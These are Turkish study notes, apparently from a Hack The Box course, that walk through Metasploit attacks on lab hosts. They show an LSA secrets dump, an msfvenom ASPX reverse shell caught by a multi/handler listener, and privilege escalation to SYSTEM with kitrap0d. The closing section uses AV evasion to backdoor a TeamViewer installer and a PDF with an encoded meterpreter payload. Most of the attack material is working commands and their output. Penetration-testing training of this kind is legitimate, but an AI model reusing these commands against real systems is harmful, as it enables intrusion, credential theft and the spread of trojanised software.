old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 

Secret  : NL$KM
cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f 

Secret  : SAC

Secret  : SAI

Secret  : SCM:{148f1a14-53f3-4074-a573-e1ccd344e1d0}

Secret  : SCM:{3D14228D-FBE1-11D0-995D-00C04FD919C1}

Secret  : _SC_Alerter / service 'Alerter' with username : NT AUTHORITY\LocalService

Secret  : _SC_ALG / service 'ALG' with username : NT AUTHORITY\LocalService

Secret  : _SC_aspnet_state / service 'aspnet_state' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dhcp / service 'Dhcp' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dnscache / service 'Dnscache' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LicenseService / service 'LicenseService' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LmHosts / service 'LmHosts' with username : NT AUTHORITY\LocalService

Secret  : _SC_MSDTC / service 'MSDTC' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcLocator / service 'RpcLocator' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcSs / service 'RpcSs' with username : NT AUTHORITY\NetworkService

Secret  : _SC_stisvc / service 'stisvc' with username : NT AUTHORITY\LocalService

Secret  : _SC_TlntSvr / service 'TlntSvr' with username : NT AUTHORITY\LocalService

Secret  : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\LocalService
```

**`lsa_dump_sam`**, kullanıcı hesaplarının parolalarının hash'lerini çıkartırken, **`lsa_dump_secrets`** daha fazla bilgi sunarak hem kullanıcı hem de uygulama hesaplarına ait şifrelenmiş verileri elde eder. Bu iki komut, sistemin güvenlik durumunu analiz etmek için farklı perspektifler sunar.

Bu noktadan sonra, eğer makine daha kapsamlı bir ağa bağlıysa, bu ganimeti sistemde gezinmek, dahili kaynaklara erişim sağlamak ve ağın genel güvenlik duruşu zayıfsa daha yüksek erişim seviyesine sahip kullanıcıları taklit etmek için kullanabiliriz.


soru1: MSF'de mevcut exploiti bulun ve hedef üzerinde bir shell elde etmek için kullanın. Shell elde ettiğiniz kullanıcının kullanıcı adı nedir?

soru2: “htb-student” kullanıcısı için NTLM parola karmasını alın. Hash değerini cevap olarak gönderin.


Çözüm  : nmap taraması sonucu 5000'ninci portda bir httpapi servisi çalışıyordu mozilladan girince bir login paneli karşıladı . MSfconsoledan uygulamanın adını arattım ve bir fileupload zafiyeti bulunan bir versiyon tespit ettim gerekli parametreleri girdikten sonra meterpreter oturumu elde ettim .  ilk soru için : --> shell --> whoami  . İkinci soru için hashdump.


# **Modüllerin Yazılması ve Import Edilmesi**
Metasploit'te yeni exploitler, yardımcılar ve özellikleri almak için `msfconsole` güncellenebilir, bu da tüm yeni modüllerin yüklenmesini sağlar. Eğer yalnızca belirli bir modüle ihtiyacımız varsa, tam güncelleme yerine modülü manuel olarak indirip yükleyebiliriz. Bu amaçla ExploitDB'den uygun Metasploit modüllerini arayarak lokal msfconsole'a aktarabiliriz.

[ExploitDB](“https://www.exploit-db.com/”), özel bir exploit ararken harika bir seçimdir. Mevcut her senaryo için farklı istismar senaryoları arasında arama yapmak için etiketleri kullanabiliriz. Bu etiketlerden biri Metasploit [Framework (MSF)](https://www.exploit-db.com/?tag=3) olup, seçildiğinde yalnızca Metasploit modülü biçiminde de mevcut olan komut dosyalarını görüntüler. Bunlar doğrudan ExploitDB'den indirilebilir ve yerel Metasploit Framework dizinimize yüklenebilir, buradan aranabilir ve `msfconsole` içinden çağrılabilir.

![Pasted image 20241028001725.png](/img/user/resimler/Pasted%20image%2020241028001725.png)

Diyelim ki `Nagios3` için bulunan bir komut enjeksiyonu açığından yararlanacak bir exploit kullanmak istiyoruz. Aradığımız modül `Nagios3 - 'statuswml.cgi' Komut Enjeksiyonu (Metasploit)`. Bu yüzden `msfconsole` 'u çalıştırıyoruz ve bu özel açığı aramaya çalışıyoruz, ancak bulamıyoruz. Bu, Metasploit framework'ümüzün güncel olmadığı veya aradığımız belirli `Nagios3` exploit modülünün Metasploit Framework'ün resmi güncellenmiş sürümünde olmadığı anlamına gelir.

#### MSF - Search for Exploits
```shell-session
msf6 > search nagios

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution
   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
   4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution
   5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution
   6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
   7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration
```

Bununla birlikte, [ExploitDB'nin girdileri içinde](https://www.exploit-db.com/exploits/9861) istismar kodunu bulabiliriz . Alternatif olarak, ExploitDB içinde belirli bir istismarı aramak için web tarayıcımızı kullanmak istemiyorsak, CLI sürümünü kullanabiliriz, `searchsploit`.

```shell-session
M1R4CKCK@htb[/htb]$ searchsploit nagios3

--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
Nagios3 - 'history.cgi' Remote Command Execution                                                                                             | multiple/remote/24084.py
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

`.rb` ile biten barındırılan dosya sonlandırmalarının, büyük olasılıkla `msfconsole` içinde kullanılmak üzere özel olarak hazırlanmış Ruby betikleri olduğunu unutmayın. Ayrıca, `msfconsole` içinde çalışamayan betiklerin çıktısını önlemek için yalnızca `.rb` dosya sonlandırmalarına göre filtreleyebiliriz. Tüm `.rb` dosyalarının otomatik olarak `msfconsole` modüllerine dönüştürülmediğini unutmayın. Bazı açıklar, içlerinde Metasploit modül uyumlu kod olmadan Ruby ile yazılmıştır. Aşağıdaki alt bölümde bu örneklerden birine bakacağız.

```shell-session
M1R4CKCK@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"

--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb
Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb
Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

`.rb` dosyasını indirmeli ve doğru dizine yerleştirmeliyiz. Tüm modüllerin, komut dosyalarının, eklentilerin ve `msfconsole` 'a özel dosyaların depolandığı varsayılan dizin `/usr/share/metasploit-framework`'tür. Kritik klasörler de ev ve root klasörlerimizde gizli `~/.msf4/` konumunda sembolik olarak bağlanmıştır.


#### MSF - Directory Structure
```shell-session
M1R4CKCK@htb[/htb]$ ls /usr/share/metasploit-framework/

app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor
config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts
data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools
```

```shell-session
M1R4CKCK@htb[/htb]$ ls .msf4/

history  local  logos  logs  loot  modules  plugins  store
```

.... Çok fazla gereksiz bilgi sonra bak ... 



# Introduction to MSFVenom
MSFVenom, MSFPayload ve MSFEncode araçlarının birleşimidir ve kullanıcıya özelleştirilebilir, tespit edilmesi zor yükler sağlar. Eskiden, MSFPayload ile belirli bir işletim sistemi veya işlemci mimarisi için shellcode oluşturulup MSFEncode’a aktarılarak kötü karakterler temizlenir ve AV/IDS gibi güvenlik yazılımlarından kaçınılırdı. MSFVenom bu işlemleri tek bir araçta sunar.

Günümüzde birleşik bu araç, sızma testçilerine farklı hedef mimariler ve sürümler için hızlı payload üretme ve shellcode'u hatasız çalışacak şekilde temizleme olanağı sunar. Ancak, AV'den kaçmak artık daha zordur; sezgisel analiz, makine öğrenimi ve derin paket incelemesi, payload'un AV tarafından yakalanma ihtimalini artırır. Basit bir payload'un 52/65 oranında AV'yi geçmesi Malware Analistleri için oldukça başarılı bir sonuçtur.


## **Payload'larımızı Oluşturma**  

Ya kimlik bilgileri zayıf olan ya da kazara Anonim girişe açık olan açık bir FTP portu bulduğumuzu varsayalım. Şimdi, FTP sunucusunun kendisinin aynı makinenin `tcp/80` portunda çalışan bir web hizmetine bağlı olduğunu ve FTP root dizininde bulunan tüm dosyaların web hizmetinin `/uploads` dizininde görüntülenebileceğini varsayalım. Ayrıca web hizmetinin, istemci olarak üzerinde çalıştırmamıza izin verilen şeylerle ilgili herhangi bir kontrole sahip olmadığını varsayalım.  

Varsayımsal olarak web hizmetinden istediğimiz her şeyi çağırmamıza izin verildiğini varsayalım. Bu durumda, bir PHP shell'ini doğrudan FTP sunucusu üzerinden yükleyebilir ve web'den erişerek yükü tetikleyebilir ve kurban makineden reverse TCP bağlantısı almamızı sağlayabiliriz.


#### Scanning the Target
```shell-session
M1R4CKCK@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5

<SNIP>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


#### FTP Anonymous Access
```shell-session
M1R4CKCK@htb[/htb]$ ftp 10.10.10.5

Connected to 10.10.10.5.
220 Microsoft FTP Service


Name (10.10.10.5:root): anonymous

331 Anonymous access allowed, send identity (e-mail name) as password.


Password: ******

230 User logged in.
Remote system type is Windows_NT.


ftp> ls

200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

aspnet_client'ı fark ettiğimizde, kutunun `.aspx` reverse shell'leri çalıştırabileceğini anlıyoruz. Neyse ki `msfvenom` bunu herhangi bir sorun olmadan yapabiliyor.


#### Generating Payload
```shell-session
M1R4CKCK@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

Şimdi, sadece `http://10.10.10.5/reverse_shell.aspx` adresine gitmemiz gerekiyor ve bu `.aspx` payload'unu tetikleyecektir. Ancak bunu yapmadan önce, msfconsole üzerinde bir listener başlatmalıyız ki reverse connection isteği onun içinde yakalansın.

#### MSF - Setting Up Multi/Handler
```shell-session
M1R4CKCK@htb[/htb]$ msfconsole -q 

msf6 > use multi/handler
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.14.5

LHOST => 10.10.14.5


msf6 exploit(multi/handler) > set LPORT 1337

LPORT => 1337


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:1337 
```

## **Payload'un Çalıştırılması**  

Şimdi web servisindeki `.aspx` payload'unu tetikleyebiliriz. Bunu yaptığımızda sayfada görsel olarak hiçbir şey yüklenmeyecektir, ancak `multi/handler` modülümüze baktığımızda bir bağlantı almış olacağız. `.aspx` dosyamızın HTML içermediğinden emin olmalıyız, böylece yalnızca boş bir web sayfası göreceğiz. Ancak, payload yine de arka planda çalıştırılır.

![Pasted image 20241028002747.png](/img/user/resimler/Pasted%20image%2020241028002747.png)

#### MSF - Meterpreter Shell

```shell-session
<...SNIP...>
[*] Started reverse TCP handler on 10.10.14.5:1337 

[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000


meterpreter > getuid

Server username: IIS APPPOOL\Web


meterpreter > 

[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died
```

Meterpreter oturumu çok sık ölüyorsa, çalışma zamanı sırasında hataları önlemek için onu kodlamayı düşünebiliriz. Uygun herhangi bir kodlayıcıyı seçebiliriz ve sonuçta ne olursa olsun başarı şansımızı artıracaktır.

## **Local Exploit Suggester**  

İpucu olarak, `Local Exploit Suggester` adında bir modül bulunmaktadır. Meterpreter shell, doğal olarak çok fazla izni olmayan `IIS APPPOOL\Web` kullanıcısına indiğinden, bu örnek için bu modülü kullanacağız. Ayrıca, `sysinfo` komutunu çalıştırmak bize sistemin x86 bit mimarisinde olduğunu göstererek Local Exploit Suggester'a güvenmemiz için daha da fazla neden veriyor.

`Local Exploit Suggester` modülü, Meterpreter oturumunu kullanarak hedef sistemde çalıştırılabilecek potansiyel yerel (local) exploitleri önerir. Bu örnekte, elde edilen Meterpreter oturumu **`IIS APPPOOL\Web` kullanıcısı** gibi düşük yetkilere sahip bir kullanıcıda açılmış durumda. Bu nedenle, yükseltilmiş yetkilerle (yani, sistem veya yönetici yetkileriyle) çalıştırmak için ek bir exploite ihtiyaç var.

Ayrıca, `sysinfo` komutu kullanılarak sistemin mimarisi hakkında bilgi edinilir. Örneğin, 32-bit (x86) bir sistem olduğunu görüyorsak, Local Exploit Suggester modülü bu bilgiyi kullanarak **o mimariye uygun exploitleri önerir**. Bu da hedef sistemde yetki yükseltme (privilege escalation) için hangi exploitlerin daha uygun olduğunu hızlıca bulmaya yardımcı olur.


#### **MSF - Local Exploit Suggester Aranıyor**
```shell-session
msf6 > search local exploit suggester

<...SNIP...>
   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session
   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester
   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure

<SNIP>

msf6 exploit(multi/handler) > use 2376
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set session 2

session => 2


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 31 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

Bu sonuçlar önümüzdeyken, test etmek için bunlardan birini kolayca seçebiliriz. Eğer seçtiğimiz sonuç geçerli değilse, bir sonrakine geçebiliriz. Tüm kontroller %100 doğru değildir ve tüm değişkenler aynı değildir. Listede aşağıya inersek, `bypassauc_eventvwr`, IIS kullanıcısının yönetici grubunun bir parçası olmaması nedeniyle başarısız olur, bu varsayılan ve beklenen bir durumdur. İkinci seçenek olan `ms10_015_kitrap0d` işe yarıyor.

#### MSF - Local Privilege Escalation

```shell-session
msf6 exploit(multi/handler) > search kitrap0d

Matching Modules
================

   #  Name                                     Disclosure Date  Rank   Check  Description
   -  ----                                     ---------------  ----   -----  -----------
   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D


msf6 exploit(multi/handler) > use 0
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     1338             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338

LPORT => 1338


msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3

SESSION => 3


msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.5:1338 
[*] Launching notepad to host the exploit...
[+] Process 3552 launched.
[*] Reflectively injecting the exploit DLL into 3552...
[*] Injecting exploit into 3552 ...
[*] Exploit injected. Injecting payload into 3552...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```


# Firewall and IDS/IPS Evasion
- Endpoint protection
- Perimeter protection (Çevre koruma)

## **Endpoint Protection**  

`Endpoint protection`, tek amacı ağ üzerindeki tek bir hostu korumak olan herhangi bir yerelleştirilmiş cihaz veya hizmeti ifade eder. Bu host kişisel bir bilgisayar, kurumsal bir workstation ya da bir ağın De-Militarized Zone (`DMZ`) bölgesindeki bir sunucu olabilir.  

Endpoint koruması genellikle `Antivirus` Koruması, `Anti-Malware` Protection (bu `bloatware`, spyware, `adware`, scareware, ransomware içerir), `Firewall` ve `Anti-DDOS` 'u aynı yazılım paketi altında bir arada bulunduran yazılım paketleri şeklinde gelir. Çoğumuz evimizdeki bilgisayarlarımızda veya işyerimizdeki iş istasyonlarında endpoint koruma yazılımı çalıştırdığımız için bu forma ikincisinden daha aşinayız. Avast, Nod32, Malwarebytes ve BitDefender sadece bazı güncel isimlerdir.


#### **Perimeter Protection**  

`Perimeter protection` genellikle ağ perimeter edge üzerinde fiziksel veya sanallaştırılmış cihazlarda bulunur. Bu `edge device` 'ların kendileri ağın `içine` `dışarıdan`, başka bir deyişle `genelden` `özele` erişim sağlar.  

Bu iki bölge arasında, bazı durumlarda, daha önce bahsedilen De-Militarized Zone (`DMZ`) olarak adlandırılan üçüncü bir bölge de bulacağız. Bu, `iç ağlarınkinden` daha `düşük güvenlik politikası seviyesine` sahip bir `bölgedir`, ancak geniş İnternet olan `dış bölgeden` daha yüksek bir `güven seviyesine` sahiptir. Burası kamuya açık sunucuların bulunduğu sanal alandır; bu sunucular kamuya açık müşteriler için İnternet'ten veri iter ve çeker ancak aynı zamanda içeriden yönetilir ve sunulan bilgileri güncel tutmak ve sunucuların müşterilerini memnun etmek için yamalar, bilgiler ve diğer verilerle güncellenir.

## **Güvenlik Politikaları**  

Güvenlik politikaları, herhangi bir ağın iyi korunan her güvenlik duruşunun arkasındaki itici güçtür. Cisco CCNA eğitim materyallerine aşina olan herkes için ACL (Erişim Kontrol Listeleri) ile aynı fonksiyonu görürler. Esasen, trafiğin veya dosyaların bir ağ sınırı içinde nasıl var olabileceğini belirleyen `allow` ve `deny` ifadelerinin bir listesidir. Birden fazla liste birden fazla ağ parçası üzerinde etkili olabilir ve bir yapılandırma içinde esneklik sağlar. Bu listeler, bulundukları yere bağlı olarak ağın ve host'ların farklı özelliklerini de hedefleyebilir:  

- Ağ Trafik İlkeleri  
- Başvuru Politikaları  
- Kullanıcı Erişim Kontrol Politikaları 
- Dosya Yönetimi Politikaları  
- DDoS Koruma Politikaları  
- Diğerleri

Yukarıdaki kategorilerin hepsinin üzerinde "Güvenlik Politikası" ibaresi bulunmasa da, bunların etrafındaki tüm güvenlik mekanizmaları aynı temel prensip olan `allow (izin ver` ) ve `deny (reddet` ) girişleri ile çalışır. Tek fark, atıfta bulundukları ve uyguladıkları nesne hedefidir. Öyleyse soru şu: Daha önce bahsedilen eylemlerin gerçekleştirilebilmesi için ağdaki olayları bu kurallarla nasıl eşleştireceğiz?  

Bir olayı veya nesneyi bir güvenlik ilkesi girişiyle eşleştirmenin birden fazla yolu vardır:

![Pasted image 20241028003919.png](/img/user/resimler/Pasted%20image%2020241028003919.png)


Günümüzde çoğu antivirüs yazılımı, kötü amaçlı kodları tespit etmek için İmza Tabanlı Algılama yöntemini kullanır ve tehditleri karantinaya alır veya işlemeyi durdurur. MSF6 ile Metasploit, Meterpreter shell'lerinden AES şifreli iletişim sağlayarak, payload'u kurban sisteme gönderirken trafiği şifreler ve ağ tabanlı IDS/IPS sistemlerinden saklanır. Ancak bazı durumlarda, katı trafik kuralları bağlantımızı engelleyebilir. Bu tür engellemeleri aşmak için, iletişime izin verilen servisleri bulmak veya DNS sızma teknikleri gibi yöntemler kullanılabilir. Encoders bölümü, çoklu kodlama şemalarıyla AV atlatma çabalarının her zaman yeterli olmadığını gösterir; sadece bir bağlantı kurmak bile bazı IDS/IPS sistemlerinde alarm oluşturabilir.

Ancak MSF6 sürümü ile msfconsole, herhangi bir Meterpreter shell'inden saldırgan host'a AES şifreli iletişimi tünelleyebilir ve payload kurban host'a gönderilirken trafiği başarılı bir şekilde şifreleyebilir. Bu çoğunlukla ağ tabanlı IDS/IPS ile ilgilenir. Bazı nadir durumlarda, gönderenin IP adresine göre bağlantımızı işaretleyen çok katı trafik kuralları ile karşılaşabiliriz. Bunu aşmanın tek yolu, geçmesine izin verilen servisleri bulmaktır. Bunun mükemmel bir örneği, kötü niyetli bilgisayar korsanlarının kritik veri sunucularından oluşan bir ağa erişmek için Apache Struts güvenlik açığını kötüye kullandıkları 2017 Equifax saldırısıdır. DNS sızma teknikleri, verileri aylarca fark edilmeden yavaşça ağdan çıkarıp bilgisayar korsanlarının etki alanına aktarmak için kullanıldı. Bu saldırı hakkında daha fazla bilgi edinmek için aşağıdaki bağlantıları ziyaret edin:

- [US Government Post-Mortem Report on the Equifax Hack](https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/)
- [Protecting from DNS Exfiltration](https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411)
- [Stoping Data Exfil and Malware Spread through DNS](https://www.infoblox.com/wp-content/uploads/infoblox-whitepaper-stopping-data-exfiltration-and-malware-spread-through-dns.pdf)

Metasploit Framework’te (msfconsole) Meterpreter’ın bellekte çalışma ve AES şifreli tünelleri sürdürme kabiliyeti, saldırı kapasitemizi artırır. Ancak, payload hedefe ulaşmadan önce dosya imzası alınıp veritabanıyla eşleştirilebilir, bu da tespit edilme riskini artırır. Antivirüs (AV) yazılımları, msfconsole modüllerini inceleyerek tanınan imzaları veritabanlarına ekler, bu da varsayılan payloadların çoğunun hemen engellenmesine yol açar.

Neyse ki, msfvenom, çalıştırılabilir dosyalar için önceden ayarlanmış şablonları kullanma seçeneği sunar. Bu, payload’u bu şablonlara enjekte ederek, meşru bir yürütülebilir dosyayı kötü amaçlı kodu başlatmak için kullanmamıza olanak tanır. Shellcode'u çeşitli yükleyicilere veya programlara yerleştirerek, kötü amaçlı kodumuzu gizleyebiliriz. Farklı kodlama şemaları ve payload varyantları ile birçok kombinasyon oluşturarak, arka kapılı yürütülebilir dosyalar geliştirebiliriz.

msfvenom'un herhangi bir yürütülebilir dosyaya nasıl payload yerleştirebildiğini anlamak için aşağıdaki parçacığa bir göz atın:

```shell-session
M1R4CKCK@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/Desktop/TeamViewer_Setup.exe
```

```shell-session
M1R4CKCK@htb[/htb]$ ls

Pictures-of-cats.tar.gz  TeamViewer_Setup.exe  Cake_recipes
```

- **`windows/x86/meterpreter_reverse_tcp`**: Bu, hedef sistemde bir Meterpreter oturumu başlatmak için kullanılan payload'dur. `reverse_tcp`, hedef sistemin belirttiğiniz `LHOST` adresine geri dönmesini sağlar.
    
- **`LHOST=10.10.14.2`**: Payload'ın, hedef sistemin geri dönüş yapacağı yerel IP adresidir. Bu, saldırganın dinleme yaptığı makinenin IP adresidir.
    
- **`LPORT=8080`**: Bu, geri dönüş bağlantısının dinleyeceği port numarasıdır. Hedef sistem, bu port üzerinden geri bağlantı kuracaktır.
    
- **`-k`**: Bu bayrak, payload'ın çalıştırılabilir bir dosya ile birlikte eklenmesini (steganoğrafi yöntemle gizlenmesini) sağlar.
    
- **`-x ~/Downloads/TeamViewer_Setup.exe`**: Bu, hedef sistemde kullanılacak meşru bir yürütülebilir dosya (TeamViewer kurulum dosyası) olarak belirtir. Payload, bu dosyaya enjekte edilecektir.
    
- **`-e x86/shikata_ga_nai`**: Bu, kullanılan encoder'dır. `shikata_ga_nai`, payload'ın imza tespitine karşı daha az görünür hale gelmesi için kullanılan bir kodlayıcıdır.
    
- **`-a x86`**: Bu, mimariyi belirtir. `x86`, 32-bit mimarisi için payload oluşturulacağını gösterir.
    
- **`--platform windows`**: Bu, payload'ın çalışacağı platformu belirtir. Burada Windows işletim sistemi hedeflenmektedir.
    
- **`-o ~/Desktop/TeamViewer_Setup.exe`**: Bu, oluşturulan payload ile birlikte enjekte edilmiş yürütülebilir dosyanın kaydedileceği yerdir. Burada, sonuç dosyası masaüstüne kaydedilecektir.
    
- **`-i 5`**: Bu, encoder'ın uygulanma sayısını belirtir. `-i 5` ifadesi, `shikata_ga_nai` encoder'ının beş kez uygulanacağı anlamına gelir; bu, daha fazla obfuscation (gizleme) sağlamak için yapılır.

Çoğunlukla, bir hedef arka kapılı bir yürütülebilir dosyayı başlattığında, hiçbir şey olmuyor gibi görünecektir, bu da bazı durumlarda şüphe uyandırabilir. Şansımızı artırmak için, ana uygulamadan ayrı bir thread'de payload'u çekerken başlatılan uygulamanın normal çalışmasının devamını tetiklememiz gerekir. Bunu yukarıda göründüğü gibi `-k` bayrağı ile yaparız. Bununla birlikte, `-k` bayrağı çalışsa bile, hedef yalnızca arka kapılı çalıştırılabilir şablonu bir CLI ortamından başlatırsa çalışan arka kapıyı fark edecektir. Bunu yaparlarsa, hedef üzerinde payload oturum etkileşimini çalıştırmayı bitirene kadar kapanmayacak olan payload ile ayrı bir pencere açılacaktır.

PDF'e ekleme :
```shell-session
msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/sample.pdf -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/modified_sample.pdf -i 5
```

## **Arşivler**  

